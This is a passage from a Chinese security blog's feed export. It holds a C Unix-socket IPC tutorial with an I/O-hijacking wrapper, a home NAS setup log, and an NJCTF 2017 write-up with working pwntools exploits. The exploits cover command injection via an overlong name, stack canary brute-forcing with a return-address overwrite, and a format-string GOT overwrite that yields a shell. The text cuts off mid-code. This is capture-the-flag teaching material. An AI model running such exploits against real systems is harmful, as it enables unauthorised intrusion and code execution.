class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//create socket </span></span><br><span class="line">    sockfd = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    address.sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strcpy</span>(address.sun_path, SERVER_NAME);</span><br><span class="line">    address.sun_path[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    len =  <span class="built_in">strlen</span>(SERVER_NAME)  + offsetof(struct sockaddr_un, sun_path);</span><br><span class="line"></span><br><span class="line">    result = connect(sockfd, (struct sockaddr*)&amp;address, len);</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;opps:client1&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//communicate with server socket</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;set send content:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;ch);</span><br><span class="line">        write(sockfd, &amp;ch, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send to server:%c \n&quot;</span>,ch);</span><br><span class="line">        read(sockfd, &amp;ch, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;read from server: %c\n&quot;</span>, ch);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;server </span><br><span class="line">server waiting...</span><br><span class="line">read from client 4: a</span><br><span class="line">server waiting...</span><br><span class="line">read from client 4: </span><br><span class="line"></span><br><span class="line">server waiting...</span><br><span class="line">read from client 4: Z</span><br><span class="line">server waiting...</span><br><span class="line">read from client 4: </span><br><span class="line"></span><br><span class="line">server waiting...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;client </span><br><span class="line">set send content:a</span><br><span class="line">send to server:a </span><br><span class="line">read from server: b</span><br><span class="line">set send content:send to server:</span><br><span class="line"> </span><br><span class="line">read from server: </span><br><span class="line"></span><br><span class="line">set send content:Z</span><br><span class="line">send to server:Z </span><br><span class="line">read from server: [</span><br><span class="line">set send content:send to server:</span><br><span class="line"> </span><br><span class="line">read from server: </span><br><span class="line">set send content:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>服务端把客户端发来的字符加一后送回了。</p>
<h4 id="0x03-关于应用"><a href="#0x03-关于应用" class="headerlink" title="0x03 关于应用"></a>0x03 关于应用</h4><p>既然是进程间的通信，那么父子进程之间通信也是可以使用这个东西的。</p>
<ol>
<li>   那这个东西就可以用来做一个wapper，赛棍们都懂的 2333333</li>
<li>   或者可以用来做简单的fuzz，子进程里启动目标程序，然后交互数据都是通过socket传递，那么就可以把一些输入变异之后再送过去吧，而且异常捕获也挺好做，waitpid就可以。不过用来做fuzzer的话，效率不知道怎么样…</li>
</ol>
<h4 id="0x04-代码"><a href="#0x04-代码" class="headerlink" title="0x04 代码"></a>0x04 代码</h4><p>首先创建套接字，然后fork产生子进程</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line">unlink(SOCK_NAME);</span><br><span class="line"><span class="keyword">int</span> s = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line"><span class="built_in">memcpy</span>(addr.sun_path, SOCK_PATH, <span class="built_in">strlen</span>(SOCK_PATH));</span><br><span class="line">addr.sun_family = AF_UNIX;</span><br><span class="line">bind(s, (struct sockaddr *)&amp;addr, <span class="built_in">strlen</span>(addr.sun_path) + <span class="keyword">sizeof</span>(addr.sun_family));</span><br><span class="line">listen(s, <span class="number">5</span>);</span><br><span class="line">pid = fork();</span><br></pre></td></tr></table></figure>
<p>父进程与子进程启动的目标程序交互，可以劫持输入输出。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">child</span>;</span></span><br><span class="line"><span class="keyword">int</span> clen = <span class="keyword">sizeof</span>(child);</span><br><span class="line"><span class="keyword">int</span> cs = accept(s, (struct sockaddr *) &amp;child, &amp;clen);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;server socket fail\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n = read(cs, buf, BUFSIZE);</span><br><span class="line">write(<span class="number">1</span>, buf, n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 在这里可以劫持输入</span></span><br><span class="line">    n = read(<span class="number">0</span>, buf, BUFSIZE);</span><br><span class="line"></span><br><span class="line">    write(cs, buf, n);</span><br><span class="line">    bzero(buf, BUFSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 劫持输出</span></span><br><span class="line">    n = read(cs, buf, BUFSIZE);</span><br><span class="line">    write(<span class="number">1</span>, buf, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>子进程里启动目标程序</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> s = socket(AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">bzero(addr.sun_path, <span class="keyword">sizeof</span>(addr.sun_path));</span><br><span class="line"><span class="built_in">memcpy</span>(addr.sun_path, SOCK_PATH, <span class="built_in">strlen</span>(SOCK_PATH));</span><br><span class="line">addr.sun_family = AF_UNIX;</span><br><span class="line">connect(s, (struct sockaddr *)&amp;addr, <span class="built_in">strlen</span>(addr.sun_path) + <span class="keyword">sizeof</span>(addr.sun_family));</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;cli socket fail\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">dup2(s, <span class="number">0</span>);</span><br><span class="line">dup2(s, <span class="number">1</span>);</span><br><span class="line">execve(<span class="string">&quot;./target&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<h4 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h4><p><a href="http://man7.org/linux/man-pages/man7/unix.7.html">manpage</a><br><a href="http://blog.csdn.net/xnwyd/article/details/7359506">linux socket进程间通信</a></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>NAS折腾记录</title>
    <url>/2020/10/07/NAS%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><p>  大概五月的时候丢失了一波数据，大概不到2TB，虽然最后救回来了一部分，但是仍然让我心有余悸，生怕这样的情况再次发生，索性申请资金买NAS，由于本身又不折腾硬件什么的，就直接一步到位选择了群晖DS218+，双盘位，x86，够折腾了。</p>
<a id="more"></a>

<p>因为是两盘位，所以尽量硬盘选择的大一点，不然后续置换很麻烦，而且为了保证数据安全肯定是要做raid的，我这里直接买了两块希捷的8T企业盘，肉疼是肯定的，但是换来的是大容量+安全性，所以还是物有所值；最后还给NAS加了一条内存，方便后面折腾docker。</p>
<h2 id="套件-amp-amp-Docker"><a href="#套件-amp-amp-Docker" class="headerlink" title="套件&amp;&amp;Docker"></a>套件&amp;&amp;Docker</h2><p>  我本身使用NAS就是为了数据备份，所以群晖提供的套件还是十分实用，有种买软件送NAS的感觉，手机相册直接使用<code>Monments</code>备份了，mac可以tm备份上去，不过我还是专门准备了一块2t的移动硬盘给mac做tm备份，重要的文件会选择多处备份，直接用了群晖的<code>Synology Drive</code>给同步到了NAS上，当然这些都比较简单基础。</p>
<p>  为了随时能连上nas使用，群晖虽然提供了quick connect，但是涉及到NAS上跑着的一些docker的时候，这样就很不方便了；所以我找联通开了公网ip，然后NAS设置里开了DDNS，然后可以用群晖提供的域名直接来访问自己的NAS了，不过为了安全起见，我开了一些安全策略以及ban掉了非必须端口，并且开了SSL。</p>
<p>在有公网ip的情况下，就可以开始造作了，我折腾的比较多的是docker：</p>
<ol>
<li>gitea</li>
<li>snell docker(for proxy)</li>
<li>Aria2 </li>
<li>Ubuntu &amp;&amp; mongodb</li>
</ol>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.27.57%402x.png"></p>
<p>为了不暴露太多端口出来（gitea的，ubuntu的啥的），我的设想是只暴露一个代理的端口，然后我连上代理，其他的容器通过代理本地访问，这样能最大限度减少风险，代理的话也不选用常用的，或者说自己做一些修改。</p>
<p>自己搞个git用真舒服啊，gitlab太重了，个人使用的话没必要，gitea比较轻量级，真香。</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.35.05%402x.png"></p>
<p>总之这还是蛮香的，配置好aria2后，下电影再结合群晖的<code>Video Station</code> 家庭影院分分钟搞起，还能随时随地学习，真香 😄</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/NAS_log/CleanShot%202020-10-07%20at%2020.37.06%402x.png"></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>NJCTF-2017部分wp</title>
    <url>/2017/03/15/NJCTF-2017%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>只做了几个很水的题目…我好菜啊</p>
<a id="more"></a>

<h4 id="0x01-re300"><a href="#0x01-re300" class="headerlink" title="0x01:re300"></a>0x01:re300</h4><p>找到了原题…直接用脚本解的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">s1, s2, enc_add</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(a) ^ <span class="built_in">ord</span>(b) ^ enc_add) <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(cycle(s1), s2))</span><br><span class="line"></span><br><span class="line">keys = [<span class="built_in">str</span>(x)*<span class="number">3</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">500</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># pull the encoded stuff out of the program&#x27;s output</span></span><br><span class="line">out, _ = subprocess.Popen([<span class="string">&#x27;./re300&#x27;</span>], stdout=subprocess.PIPE).communicate()</span><br><span class="line">hex_enc = out.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>].split()[-<span class="number">1</span>]</span><br><span class="line">enc = hex_enc.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">    enc_add = <span class="built_in">len</span>(enc) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    enc = xor(key, enc, enc_add)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> enc</span><br></pre></td></tr></table></figure>
<p>得到<code>NJCTF&#123;2c3010644150e03b6630a0b3b7f8607b&#125;</code></p>
<h4 id="0x02-vsvs"><a href="#0x02-vsvs" class="headerlink" title="0x02:vsvs"></a>0x02:vsvs</h4><p>脑洞…数字22是爆破来的，然后就不知道干啥了，瞎脑洞发现可以足够长的buffer之后的字符串会被当成命令执行(name那里)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">p,code</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;code:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(code))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">p,<span class="built_in">input</span>,name</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;input:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">input</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    length = <span class="number">1024</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    while True:</span></span><br><span class="line"><span class="string">        p = remote(&#x27;218.2.197.235&#x27;,23749)</span></span><br><span class="line"><span class="string">        login(p,22)</span></span><br><span class="line"><span class="string">        payload = &quot;a&quot; * length + &#x27;ls&#x27;</span></span><br><span class="line"><span class="string">        handle(p,&#x27;muhe&#x27;,payload)</span></span><br><span class="line"><span class="string">        length += 1</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p = remote(<span class="string">&#x27;218.2.197.235&#x27;</span>,<span class="number">23749</span>)</span><br><span class="line">    login(p,<span class="number">22</span>)</span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span> * length + <span class="string">&#x27;cat&lt;flag&#x27;</span></span><br><span class="line">    handle(p,<span class="string">&#x27;muhe&#x27;</span>,payload)</span><br><span class="line">    <span class="built_in">print</span> p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="0x03-pwn200"><a href="#0x03-pwn200" class="headerlink" title="0x03:pwn200"></a>0x03:pwn200</h4><p>栈溢出简单粗暴，不过需要暴力猜解canary，然后直接ret到send flag的函数那里，把flag读回来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">if LOCAL:</span></span><br><span class="line"><span class="string">    p = process(&#x27;filename&#x27;)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    p = remote(&#x27;127.0.0.1&#x27;,5555)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_canary</span>():</span></span><br><span class="line">    canary = <span class="string">&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(canary) == <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">            canary_tmp = canary + <span class="built_in">chr</span>(item)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = remote(<span class="string">&#x27;218.2.197.234&#x27;</span>, <span class="number">2090</span>)</span><br><span class="line">                <span class="comment">#r = remote(&#x27;127.0.0.1&#x27;,5555)</span></span><br><span class="line">                r.recvuntil(<span class="string">&quot;Welcome!\n&quot;</span>)</span><br><span class="line">                payload = <span class="string">&quot;A&quot;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)</span><br><span class="line">                payload += canary_tmp</span><br><span class="line">                r.send(payload)</span><br><span class="line">                data = r.recv(<span class="number">100</span>,timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;Message received!&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                    canary += <span class="built_in">chr</span>(item)</span><br><span class="line">                    log.info(<span class="string">&quot;get:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(item)))</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                r.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="comment">#raw_input(&quot;now,stop&quot;)</span></span><br><span class="line">    log.info(<span class="string">&quot;[*] canary:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(u64(canary))))</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#canary_local = 0x977e4ba376461900</span></span><br><span class="line">    canary = <span class="number">0x9dccf42e364dcf00</span></span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span> *(<span class="number">0x70</span>-<span class="number">0x8</span>) + p64(canary) + <span class="string">&quot;aaaaaaaa&quot;</span>+p64(<span class="number">0x0000000000400BC6</span>)</span><br><span class="line">    r = remote(<span class="string">&#x27;218.2.197.234&#x27;</span>, <span class="number">2090</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Welcome!\n&quot;</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    <span class="built_in">print</span> r.recvline(<span class="number">1024</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    r.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="0x04-pwn300-未做出"><a href="#0x04-pwn300-未做出" class="headerlink" title="0x04 : pwn300(未做出)"></a>0x04 : pwn300(未做出)</h4><p>无bin文件的格式化字符串，探测之后发现时x86的程序。<br>首先dump file吧，然后leak got，查libc，确定system，直接改了printf的got去get shell。<br>比赛的时候offset一直查不到…就gg了，后来joker师傅的libc库贼全，给了我offset。(我一定好好收集libc…)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;218.2.197.235&#x27;</span>,<span class="number">23745</span>)</span><br><span class="line">    <span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line"></span><br><span class="line">setbuf_got = <span class="number">0x08049970</span></span><br><span class="line">printf_got = <span class="number">0x08049974</span></span><br><span class="line">puts_got   = <span class="number">0x08049980</span></span><br><span class="line">fgets_got  = <span class="number">0x08049978</span></span><br><span class="line">strchar_got= <span class="number">0x08049984</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_leak</span>(<span class="params">addr,length=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = <span class="string">&quot;BBBB&quot;</span> + <span class="string">&quot;%9$s&quot;</span> + p32(addr) + <span class="string">&quot;AAAA&quot;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;BBBB&#x27;</span>)</span><br><span class="line">    data = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;me&#x27;</span>)</span><br><span class="line">    <span class="comment">#fucking info leak work...</span></span><br><span class="line">    data = info_leak(setbuf_got)</span><br><span class="line">    log.info(<span class="string">&quot;puts:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(data)))</span><br><span class="line">    data = info_leak(fgets_got)</span><br><span class="line">    log.info(<span class="string">&quot;setbuf:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(data)))</span><br><span class="line">    data = info_leak(fgets_got)</span><br><span class="line">    log.info(<span class="string">&quot;fgets:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(data)))</span><br><span class="line">    data = info_leak(strchar_got)</span><br><span class="line">    log.info(<span class="string">&quot;strchr:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(data)))</span><br><span class="line">    <span class="comment">#printf_got = 0x08049974 #local</span></span><br><span class="line">    data = info_leak(printf_got)</span><br><span class="line">    log.info(<span class="string">&quot;printf:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(data)))</span><br><span class="line">    <span class="comment">#local_offset = 59600</span></span><br><span class="line">    system_addr = data - offset</span><br><span class="line">    log.info(<span class="string">&quot;system:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"></span><br><span class="line">    write = system_addr &amp; <span class="number">0xffffff</span></span><br><span class="line">    two = write&amp;<span class="number">0xffff</span></span><br><span class="line">    one = (write&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    payload = p32(printf_got+<span class="number">2</span>)</span><br><span class="line">    payload += p32(printf_got)</span><br><span class="line">    payload += <span class="string">&quot;%&#123;0&#125;c%7$hhn%&#123;1&#125;c%8$hn&quot;</span>.<span class="built_in">format</span>(one-<span class="number">8</span>,two-one)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    remote_offset = <span class="number">0xe6e0</span></span><br><span class="line">    exp(remote_offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x05-mobile100-safebox"><a href="#0x05-mobile100-safebox" class="headerlink" title="0x05: mobile100-safebox"></a>0x05: mobile100-safebox</h4><p>暴力跑testAndroid里的check逻辑，可以得到两组解，只有一组符合要求。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.muhe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javafx.beans.property.IntegerProperty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String flag = <span class="string">&quot;NJCTF&#123;have&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> num1 = <span class="number">48533584</span>;</span><br><span class="line">        System.out.println(flag + (((<span class="keyword">char</span>)(num1 / <span class="number">1000000</span>))) + (((<span class="keyword">char</span>)(num1 / <span class="number">10000</span> % <span class="number">100</span>))) + (((<span class="keyword">char</span>)(num1 / <span class="number">100</span> % <span class="number">100</span>+<span class="number">10</span>))) + <span class="string">&quot;f4n&#125;&quot;</span>);</span><br><span class="line">        num1 = <span class="number">48539584</span>;</span><br><span class="line">        System.out.println(flag + (((<span class="keyword">char</span>) (num1 / <span class="number">1000000</span>))) + (((<span class="keyword">char</span>) (num1 / <span class="number">10000</span> % <span class="number">100</span>))) + (((<span class="keyword">char</span>) (num1 / <span class="number">100</span> % <span class="number">100</span> + <span class="number">10</span>))) + <span class="string">&quot;f4n&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Crack ck = <span class="keyword">new</span> Crack();</span><br><span class="line">        ArrayList list = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">10000000</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num&gt;<span class="number">99999999</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">boolean</span> ret = ck.crack(num);</span><br><span class="line">            <span class="keyword">if</span>(ret)&#123;</span><br><span class="line">                list.add(num);</span><br><span class="line">            &#125;</span><br><span class="line">            num += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;list.size();i++)&#123;</span><br><span class="line">            System.out.println(list.get(i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.muhe;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by muhe on 2017/3/11.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Crack</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">crack</span><span class="params">(<span class="keyword">int</span> v4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> v11 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span>(v4 &gt; <span class="number">10000000</span> &amp;&amp; v4 &lt; <span class="number">99999999</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> v7 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> v8 = <span class="number">10000000</span>;</span><br><span class="line">            <span class="keyword">int</span> v3 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(Math.abs(v4 / <span class="number">1000</span> % <span class="number">100</span> - <span class="number">36</span>) == v11 &amp;&amp; v4 % <span class="number">1000</span> % <span class="number">584</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> v5 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(v5 &lt; v11) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v4 / v7 % <span class="number">10</span> != v4 / v8 % <span class="number">10</span>) &#123;</span><br><span class="line">                        v3 = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        v7 *= <span class="number">10</span>;</span><br><span class="line">                        v8 /= <span class="number">10</span>;</span><br><span class="line">                        ++v5;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(v3 != <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span 